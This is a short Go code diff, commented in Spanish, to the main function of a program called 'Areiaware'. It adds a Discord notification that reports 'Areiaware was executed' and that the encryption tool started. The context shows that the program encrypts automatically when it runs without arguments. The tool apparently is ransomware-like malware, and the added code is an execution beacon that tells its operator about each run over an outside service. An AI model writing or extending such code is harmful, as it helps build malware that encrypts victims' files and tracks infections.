@@ -11,6 +11,34 @@ import (
 )
 
 func main() {
+
+    // Cargamos las configuraciones del json
+    err := atena.LoadConfig()
+    if err != nil {
+        fmt.Println(err)
+        os.Exit(1)
+    }
+
+    // Inicializar Discord
+    err = atena.InitDiscord()
+    if err != nil {
+        fmt.Printf("  Discord Error: %v\n", err)
+        fmt.Println("   Continuing without Discord notifications...")
+    }
+
+    err = atena.SendNotificationEmbed(
+        "Areiaware was executed",
+        "The encryption tool has started successfully.",
+        0x00ff00, // Verde 
+    )
+
+    if err != nil {
+        fmt.Printf("Error in embed notification: %v\n", err)
+    }else{
+        fmt.Println(" Discord notification sent successfully")
+    }
+
+    
     banner() // Mostramos el banner
 
     // Si no hay argumentos, encriptar automáticamente
